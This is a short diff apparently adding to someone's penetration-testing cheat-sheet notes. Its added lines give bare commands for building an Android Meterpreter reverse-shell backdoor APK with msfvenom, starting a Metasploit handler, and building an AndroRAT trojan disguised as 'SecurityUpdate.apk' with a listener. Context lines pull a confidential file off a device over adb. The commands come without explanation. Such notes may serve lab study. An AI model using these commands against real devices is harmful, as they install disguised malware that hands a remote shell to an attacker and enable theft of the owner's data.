@@ -63,7 +63,23 @@ adb connect 172.16.0.21 5555
 adb shell
 adb pull /sdcard/Documents/confidential.txt
 ```
+```
+msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.1.13 R > Desktop/Backdoor.apk 
 
+msfconsole
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST 10.10.1.13
+exploit -j -z 
+
+```
+```
+python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk 
+python3 androRAT.py --shell -i 0.0.0.0 -p 4444 
+```
+```
+https://www.sisik.eu/apk-tool
+```
 yersinia F2 x 1 q ==>Wireshark Transaction ID 0x643c9869
 
 ```
